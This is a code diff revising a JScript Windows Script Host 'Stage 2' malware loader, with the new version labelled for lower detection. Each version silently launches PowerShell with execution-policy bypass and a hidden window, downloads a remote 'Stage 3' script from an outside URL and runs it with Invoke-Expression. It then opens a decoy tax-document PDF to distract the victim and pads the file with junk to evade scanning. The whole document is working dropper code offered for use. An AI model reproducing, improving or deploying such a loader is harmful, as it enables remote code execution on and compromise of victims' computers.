@@ -1,38 +1,29 @@
 // =============================================
-// Clean Stage 2 Loader - Fixed for WSH
-// Calls your working Stage 3
+// Minimal Stage 2 Loader - Low Detection
 // =============================================
 
 (function() {
     try {
         var wsh = new ActiveXObject("WScript.Shell");
 
-        // ================== STAGE 3 ==================
-        var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";
+        // Stage 3 URL (your working one)
+        var stage3 = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";
 
-        var psCmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + 
-                    stage3Url + 
-                    '\' -UseBasicParsing).Content"';
+        // Run Stage 3
+        var cmd = '-ep Bypass -WindowStyle Hidden -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3 + '\' -UseBasicParsing).Content"';
+        wsh.Run("powershell.exe " + cmd, 0, false);
 
-        wsh.Run("powershell.exe " + psCmd, 0, false);
+        WScript.Sleep(700);
 
-        // Small delay so Stage 3 starts first
-        WScript.Sleep(800);
+        // Decoy
+        var decoy = '-ep Bypass -WindowStyle Hidden -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'; Start-Process \'$env:USERPROFILE\\Downloads\\Michael Williams Taxdocs 2026.pdf\'"';
+        wsh.Run("powershell.exe " + decoy, 0, false);
 
-        // ================== DECOY ==================
-        var decoyCmd = '-ep Bypass -WindowStyle Hidden -c "' +
-                       'Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Michael_Williams_Taxdocs_2026.pdf\' -UseBasicParsing; ' +
-                       'Start-Process \'$env:USERPROFILE\\Downloads\\Michael_Williams_Taxdocs_2026.pdf\'"';
+    } catch(e) {}
 
-        wsh.Run("powershell.exe " + decoyCmd, 0, false);
-
-    } catch(e) {
-        // Silent fail
-    }
-
-    // ================== JUNK TO MAKE FILE ~9MB ==================
-    var junk = "";
-    for(var i = 0; i < 9300000; i++) {
-        junk += "x";
+    // Minimal junk (less suspicious)
+    var junk = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+    for(var i = 0; i < 85; i++) {
+        junk += junk;
     }
 })();
